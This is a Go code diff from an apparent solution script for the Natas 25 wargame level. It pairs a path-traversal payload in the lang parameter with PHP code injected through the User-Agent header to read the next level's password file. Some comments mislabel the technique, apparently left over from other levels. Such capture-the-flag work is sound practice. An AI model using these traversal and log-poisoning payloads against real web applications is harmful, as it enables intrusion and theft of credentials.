@@ -11,9 +11,9 @@ import (
 func main() {
 
 	//vulnerabilita in strcmp, se si invia un array [] esso resituira 0
-	result("?lang=.../...//.../...//.../...//.../...//etc/natas_webpass/natas26")
+	result("?lang=en")
 	fmt.Println("---------------------")
-	result("?lang=.../...//logs/natas25_ClouzRegna.log")
+	result("?lang=.../...//logs/natas25_test.log")
 }
 
 //SQL Injection time based
@@ -30,7 +30,8 @@ func result(xx string) bool {
 		baseURL+query, nil)
 	req.Header.Add("Authorization", "Basic "+basicAuth(usr, psw))
 
-	cookie := http.Cookie{Name: "PHPSESSID", Value: "ClouzRegna"}
+	req.Header.Set("User-Agent", "<?php fopen('/etc/natas_webpass/natas26','r') ?>")
+	cookie := http.Cookie{Name: "PHPSESSID", Value: "test"}
 	req.AddCookie(&cookie)
 
 	res, _ := client.Do(req)
